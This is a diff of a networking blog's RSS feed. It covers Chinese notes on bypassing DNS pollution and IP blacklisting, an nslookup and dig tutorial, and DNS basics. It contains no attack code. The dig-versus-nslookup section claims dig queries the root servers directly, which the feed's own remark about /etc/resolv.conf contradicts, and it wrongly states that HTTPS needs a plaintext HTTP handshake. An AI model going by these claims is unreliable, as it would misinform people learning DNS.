+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;使用加密代理&lt;/strong&gt;，比如Shadowsocks，在加密代理里进行远程DNS解析，或者使用VPN上网。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;修改hosts文件&lt;/strong&gt;，操作系统中Hosts文件的权限优先级高于DNS服务器，操作系统在访问某个域名时，会先检测HOSTS文件，然后再查询DNS服务器。可以在hosts添加受到污染的DNS地址来解决DNS污染和DNS劫持。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;通过一些软件编程处理&lt;/strong&gt;，可以直接忽略返回结果是虚假IP地址的数据包，直接解决DNS污染的问题。如果你是Firefox用户，并且只用Firefox，又懒得折腾，直接打开Firefox的远程DNS解析就行了。在地址栏中输入：&lt;code&gt;about:config&lt;/code&gt;找到 &lt;code&gt;network.proxy.socks_remote_dns&lt;/code&gt; 一项改成true。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;使用DNSCrypt软件&lt;/strong&gt;，此软件与使用的OpenDNS直接建立相对安全的TCP连接并加密请求数据，从而不会被污染。 对于被DNS污染的网站站长来说，最有效的方法就是 换域名或者IP 了。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;23-ip黑名单&#34;&gt;2.3. ip黑名单&lt;/h3&gt;
+&lt;p&gt;即使没有DNS污染 或者 你获得了正确的IP，你就能正常访问这些被屏蔽的网站了吗？&lt;/p&gt;
+&lt;p&gt;不，墙目前已经有了IP黑名单，针对谷歌这种网站已经不再是普通的DNS污染了，因为总会有办法访问被DNS污染的网站（比如指定Hosts）。&lt;/p&gt;
+&lt;p&gt;那么就直接把所有的谷歌IP拉黑不就好了？就算你获得了正确的谷歌IP，但是当你去访问这个IP的时候，墙会发现这个IP存在于黑名单中，于是直接阻断，于是浏览器就会提示：www.google.com 的响应时间过长等等&lt;/p&gt;
+&lt;h2 id=&#34;3-常见代理方式&#34;&gt;3. 常见代理方式&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;VPN
+&lt;ul&gt;
+&lt;li&gt;常见协议: IPSec, OpenVPN, L2TP, WireGuard&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Shadowsocks (代理服务器)
+&lt;ul&gt;
+&lt;li&gt;常见协议: SOCKS5&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;V2Ray (代理服务器)
+&lt;ul&gt;
+&lt;li&gt;常见协议: VMess&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;HTTP 代理 (代理服务器)
+&lt;ul&gt;
+&lt;li&gt;已被封锁, 原因是HTTP代理并不对数据进行加密, 即使流量能够绕过初步的审查，传输的内容仍然是透明的，容易被监控。&lt;/li&gt;
+&lt;li&gt;即使使用 HTTPS 也不会实现全局加密, 在建立 TLS 握手验证时还是需要一个HTTP明文连接&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;了解更多: &lt;a href=&#34;https://superxlcr.github.io/2018/07/01/%E4%B8%8A%E7%BD%91%E9%99%90%E5%88%B6%E5%92%8C%E7%BF%BB%E5%A2%99%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/&#34;&gt;上网限制和翻墙基本原理 | superxlcr&amp;rsquo;s notebook&lt;/a&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Tools Commonly Used in Networking</title>
+      <link>https://blog.jiyi27.com/posts/networking/006-commands-in-network/</link>
+      <pubDate>Tue, 31 Oct 2023 15:23:08 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/networking/006-commands-in-network/</guid>
+      <description>&lt;h2 id=&#34;1-nslookup&#34;&gt;1. &lt;code&gt;nslookup&lt;/code&gt;&lt;/h2&gt;
+&lt;h3 id=&#34;11-query-a-record&#34;&gt;1.1. Query &lt;code&gt;A Record&lt;/code&gt;&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# basic DNS lookup&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ nslookup google.com                             
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Server:		192.168.2.1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Address:	192.168.2.1#53
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Non-authoritative answer:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Name:	google.com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Address: 142.250.81.238
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;12-reverse-dns-look-up&#34;&gt;1.2. Reverse DNS look-up&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ nslookup 18.219.46.189                          
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Server:		192.168.2.1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Address:	192.168.2.1#53
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Non-authoritative answer:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;189.46.219.18.in-addr.arpa	name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ec2-18-219-46-189.us-east-2.compute.amazonaws.com.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Authoritative answers can be found from:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;46.219.18.in-addr.arpa	nameserver &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ns1-24-us-east-2.ec2-rdns.amazonaws.com.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;13-query-name-server&#34;&gt;1.3. Query name server&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ nslookup -type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ns google.com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Server:		192.168.2.1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Address:	192.168.2.1#53
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Non-authoritative answer:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;google.com	nameserver &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ns1.google.com.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;google.com	nameserver &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ns3.google.com.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;....
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;When using the nslookup utility to query Domain Name System (DNS) servers, you could see the message “Non-authoritative answer.” This tells you that the DNS server you’re asking can’t ensure that it has the official, up-to-date information for the domain name or IP address you’re seeking up and is instead giving you a cached response that it got from another DNS server.&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;1-nslookup&#34;&gt;1. &lt;code&gt;nslookup&lt;/code&gt;&lt;/h2&gt;
+&lt;h3 id=&#34;11-query-a-record&#34;&gt;1.1. Query &lt;code&gt;A Record&lt;/code&gt;&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# basic DNS lookup&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ nslookup google.com                             
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Server:		192.168.2.1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Address:	192.168.2.1#53
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Non-authoritative answer:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Name:	google.com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Address: 142.250.81.238
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;12-reverse-dns-look-up&#34;&gt;1.2. Reverse DNS look-up&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ nslookup 18.219.46.189                          
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Server:		192.168.2.1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Address:	192.168.2.1#53
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Non-authoritative answer:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;189.46.219.18.in-addr.arpa	name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ec2-18-219-46-189.us-east-2.compute.amazonaws.com.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Authoritative answers can be found from:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;46.219.18.in-addr.arpa	nameserver &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ns1-24-us-east-2.ec2-rdns.amazonaws.com.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;13-query-name-server&#34;&gt;1.3. Query name server&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ nslookup -type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ns google.com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Server:		192.168.2.1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Address:	192.168.2.1#53
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Non-authoritative answer:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;google.com	nameserver &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ns1.google.com.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;google.com	nameserver &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ns3.google.com.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;....
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;When using the nslookup utility to query Domain Name System (DNS) servers, you could see the message “Non-authoritative answer.” This tells you that the DNS server you’re asking can’t ensure that it has the official, up-to-date information for the domain name or IP address you’re seeking up and is instead giving you a cached response that it got from another DNS server.&lt;/p&gt;
+&lt;p&gt;Please note that getting non-authoritative answers doesn&amp;rsquo;t mean incorrect or unreliable. However, if you need the &lt;strong&gt;most accurate and up-to-date information&lt;/strong&gt;, it is recommended to use authoritative DNS servers for queries.&lt;/p&gt;
+&lt;p&gt;Reference:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.geeksforgeeks.org/nslookup-command-in-linux-with-examples/&#34;&gt;Nslookup Command in Linux with Examples - GeeksforGeeks&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://ioflood.com/blog/what-is-the-meaning-of-non-authoritative-answer-given-by-nslookup-dns-demystified/&#34;&gt;Why is “Non-authoritative answer” given by nslookup? DNS Explained&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;14-get-authoritative-answer&#34;&gt;1.4. Get authoritative answer&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;Step 1:&lt;/strong&gt; Use the &lt;code&gt;nslookup&lt;/code&gt; command to query the SOA (Start of Authority) record of the domain name. The SOA record contains information about the authoritative name servers for the domain.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ nslookup -type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;soa davidzhu.xyz
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Non-authoritative answer:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Authoritative answers can be found from:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;davidzhu.xyz	nameserver &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ns1.dnsowl.com.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;davidzhu.xyz	nameserver &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ns2.dnsowl.com.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;davidzhu.xyz	nameserver &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ns3.dnsowl.com.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Step 2:&lt;/strong&gt; Identify the primary name server from previous response:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ nslookup davidzhu.xyz ns1.dnsowl.com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Server:		ns1.dnsowl.com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Address:	162.159.27.173#53
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Name:	davidzhu.xyz
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Address: 185.199.108.153
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2-dig&#34;&gt;2. &lt;code&gt;dig&lt;/code&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;dig&lt;/strong&gt; command stands for &lt;em&gt;&lt;strong&gt;Domain Information Groper&lt;/strong&gt;&lt;/em&gt;. It is used for retrieving information about DNS name servers. Dig command replaces older tools such as &lt;a href=&#34;https://www.geeksforgeeks.org/nslookup-command-in-linux-with-examples/&#34;&gt;nslooku&lt;/a&gt;p and the &lt;a href=&#34;https://www.geeksforgeeks.org/host-command-in-linux-with-examples/&#34;&gt;host&lt;/a&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;21-query-a-record&#34;&gt;2.1. Query &lt;code&gt;A Record&lt;/code&gt;&lt;/h3&gt;
+&lt;p&gt;To query domain “A” record with &lt;code&gt;+short&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ dig geeksforgeeks.org +short
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;34.218.62.116
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Specify DNS server:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ dig geeksforgeeks.org +short @8.8.8.8
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;By default, dig command will query the name servers listed in “/etc/resolv.conf” to perform a DNS lookup. We can change it by using @ symbol followed by a hostname or IP address of the name server.&lt;/p&gt;
+&lt;p&gt;Learn more about &lt;code&gt;/etc/resolv.conf&lt;/code&gt; and &lt;code&gt;/etc/hosts&lt;/code&gt;: &lt;a href=&#34;https://davidzhu.xyz/post/networking/002-host-file-dns-stub-resolver/&#34;&gt;DNS Stub and Recursive Resolver - Config Files - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;22-reverse-dns-lookup&#34;&gt;2.2. Reverse DNS lookup&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ dig -x 18.219.46.189 +short
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ec2-18-219-46-189.us-east-2.compute.amazonaws.com.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;23-query-name-server&#34;&gt;2.3. Query name server&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ dig davidzhu.xyz NS +short
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ns1.dnsowl.com.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ns2.dnsowl.com.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ns3.dnsowl.com.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3-dig-vs-nslookup&#34;&gt;3. dig vs nslookup&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;dig&lt;/code&gt; Process:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;dig&lt;/code&gt; follows the standard DNS resolution process, starting with a query to the &lt;strong&gt;root name servers&lt;/strong&gt; to obtain the list of TLD name servers.&lt;/li&gt;
+&lt;li&gt;It then queries a TLD name server to obtain the authoritative name servers for the domain.&lt;/li&gt;
+&lt;li&gt;After obtaining the &lt;strong&gt;authoritative name servers&lt;/strong&gt;, &lt;code&gt;dig&lt;/code&gt; sends a direct query to one of these name servers to retrieve the A record for the domain.&lt;/li&gt;
+&lt;li&gt;The response obtained from &lt;code&gt;dig&lt;/code&gt; is typically authoritative, as it comes directly from the authoritative name server responsible for the domain.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;nslookup&lt;/code&gt; Process:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;nslookup&lt;/code&gt; queries the DNS server configured on the local system by default. This DNS server may be provided by the ISP or manually configured.&lt;/li&gt;
+&lt;li&gt;The response from &lt;code&gt;nslookup&lt;/code&gt; may be non-authoritative, indicating that the DNS server providing the response is not the authoritative server for the queried domain. It may have obtained the response from its cache or forwarded the query to another DNS server.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;In summary, &lt;code&gt;dig&lt;/code&gt; directly queries authoritative name servers to obtain DNS information, resulting in authoritative responses. On the other hand, &lt;code&gt;nslookup&lt;/code&gt; queries the local DNS server, which may or may not provide authoritative responses, depending on its configuration and the nature of the query.&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>DNS Concepts (NameServer(NS), DNS Records and Caching)</title>
+      <link>https://blog.jiyi27.com/posts/networking/002-dns-basics/</link>
+      <pubDate>Tue, 31 Oct 2023 09:50:20 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/networking/002-dns-basics/</guid>
+      <description>&lt;h2 id=&#34;1-dns&#34;&gt;1. DNS&lt;/h2&gt;
+&lt;p&gt;DNS stands for Domain Name System, and it is a distributed hierarchical system that translates human-readable domain names into IP addresses. The process of &lt;strong&gt;DNS resolution&lt;/strong&gt; involves converting a hostname (such as &lt;a href=&#34;https://www.example.com&#34;&gt;www.example.com&lt;/a&gt;) into a computer-friendly IP address (such as 192.168.1.1).&lt;/p&gt;
+&lt;p&gt;The main components of the DNS are DNS servers. All DNS servers fall into one of four categories: Recursive resolvers, root nameservers, TLD nameservers, and authoritative nameservers.&lt;/p&gt;
+&lt;h3 id=&#34;11-dns-stub-resolver&#34;&gt;1.1. DNS stub resolver&lt;/h3&gt;
+&lt;p&gt;Before introduce the DNS servers, there is a software runs on the client whcih called DNS stub resolver should be noted.&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;1-dns&#34;&gt;1. DNS&lt;/h2&gt;
+&lt;p&gt;DNS stands for Domain Name System, and it is a distributed hierarchical system that translates human-readable domain names into IP addresses. The process of &lt;strong&gt;DNS resolution&lt;/strong&gt; involves converting a hostname (such as &lt;a href=&#34;https://www.example.com&#34;&gt;www.example.com&lt;/a&gt;) into a computer-friendly IP address (such as 192.168.1.1).&lt;/p&gt;
+&lt;p&gt;The main components of the DNS are DNS servers. All DNS servers fall into one of four categories: Recursive resolvers, root nameservers, TLD nameservers, and authoritative nameservers.&lt;/p&gt;
+&lt;h3 id=&#34;11-dns-stub-resolver&#34;&gt;1.1. DNS stub resolver&lt;/h3&gt;
+&lt;p&gt;Before introduce the DNS servers, there is a software runs on the client whcih called DNS stub resolver should be noted.&lt;/p&gt;
+&lt;p&gt;DNS stub resolver runs on the client machine, which is used to initiate DNS queries, and it sends the DNS query to the recursive resolver, which then performs the actual DNS resolution process (usually provided by your internet service provider (ISP) or a public DNS resolver like Google&amp;rsquo;s 8.8.8.8 or Cloudflare&amp;rsquo;s 1.1.1.1).&lt;/p&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://davidzhu.xyz/post/network/002-dns/&#34;&gt;DNS Stub and Recursive Resolver - Config Files - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;12-recursive-resolver&#34;&gt;1.2. Recursive resolver&lt;/h3&gt;
+&lt;p&gt;As we mentioned above, recursive resolver performs the actual &lt;strong&gt;DNS resolution&lt;/strong&gt; process, and it&amp;rsquo;s a DNS server actually, usually provided by your internet service provider (ISP) or a public DNS resolver like Google&amp;rsquo;s &lt;code&gt;8.8.8.8&lt;/code&gt; or Cloudflare&amp;rsquo;s &lt;code&gt;1.1.1.1&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;A recursive resolver (also known as a DNS recursor) is the first stop in a DNS query. The recursive resolver acts as a middleman between a client and a DNS nameserver. When a recursive resolver receives a query from a stub resolver, a recursive resolver will either respond with cached data, or send a request to a &lt;em&gt;root nameserver&lt;/em&gt;, followed by another request to a &lt;em&gt;TLD nameserver&lt;/em&gt;, and then one last request to an &lt;em&gt;authoritative nameserver&lt;/em&gt;. After receiving a response from the authoritative nameserver containing the requested IP address, the recursive resolver then sends a response to the client.&lt;/p&gt;
+&lt;p&gt;During this process, &lt;strong&gt;the recursive resolver will cache information received from authoritative nameservers&lt;/strong&gt;. When a client requests the IP address of a domain name that was recently requested by another client, the resolver can circumvent the process of communicating with the nameservers, and just deliver the client the requested record from its cache.&lt;/p&gt;
+&lt;h3 id=&#34;13-root-nameserver--tld-nameserver&#34;&gt;1.3. Root nameserver &amp;amp; TLD nameserver&lt;/h3&gt;
+&lt;p&gt;The 13 DNS root nameservers are known to every recursive resolver, and they are the first stop in a recursive resolver’s quest for DNS records. A root server accepts a recursive resolver’s query which includes a domain name, and the root nameserver responds by directing the recursive resolver to a TLD nameserver, based on the extension of that domain (.com, .net, .org, etc.).&lt;/p&gt;
+&lt;p&gt;A TLD nameserver maintains information for all the domain names that share a common domain extension, such as .com, .net, or whatever comes after the last dot in a URL. For example, a .com TLD nameserver contains information for every website that ends in ‘.com’. If a user was searching for google.com, after receiving a response from a root nameserver, the recursive resolver would then send a query to a .com TLD nameserver, which would respond by pointing to the authoritative nameserver (see below) for that domain.&lt;/p&gt;
